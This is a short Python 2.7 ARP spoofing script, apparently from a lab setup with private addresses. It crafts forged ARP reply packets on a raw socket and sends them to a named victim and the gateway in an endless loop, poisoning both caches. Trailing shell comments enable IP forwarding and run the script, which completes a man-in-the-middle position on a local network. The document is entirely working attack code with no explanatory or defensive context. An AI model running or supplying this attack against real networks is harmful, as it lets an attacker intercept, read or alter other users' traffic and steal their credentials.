
#cat > arp_spoofing.py

#Python 2.7
#-*-coding:utf-8 -*-
import sys
import socket
import struct
import binascii
try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
except socket.error, msg:
        print "Failed to create socket. Error type : " + str(msg[0]) + " Message : " + msg[1]
        sys.exit()
try:
        s.bind(("eth0", socket.htons(0x0800)))
except socket.error, msg:
        print "Failed to bind socket. Error type : " + str(msg[0]) + " Message : " + msg[1]
        sys.exit()

hardware_type = "\x00\x01"
protocol_type = "\x08\x00"
hardware_address_length = "\x06"
protocol_address_length = "\x04"
operation_type = "\x00\x02"

gateway_ip = "192.168.10.2"
victim_ip = "192.168.10.202" 
gateway_ip = socket.inet_aton(gateway_ip)
victim_ip = socket.inet_aton(victim_ip)

gateway_mac = "\x00\x50\x56\xfb\x40\x0c"
victim_mac ="\x00\x0c\x29\xc5\xf8\x30"
attacker_mac = "\x00\x0c\x29\x84\x9c\x55"

type = "\x08\x06"

gateway_ethernet = gateway_mac + attacker_mac + type
victim_ethernet = victim_mac + attacker_mac + type

victim_arp = victim_ethernet + hardware_type + protocol_type + hardware_address_length + protocol_address_length + operation_type + attacker_mac + gateway_ip + victim_mac + victim_ip
gateway_arp = gateway_ethernet + hardware_type + protocol_type + hardware_address_length + protocol_address_length + operation_type + attacker_mac + victim_ip + gateway_mac + gateway_ip

while True:
	s.send(victim_arp)
	s.send(gateway_arp)

#echo 1 > /proc/sys/net/ipv4/ip_forward

#python arp_spoofing.py
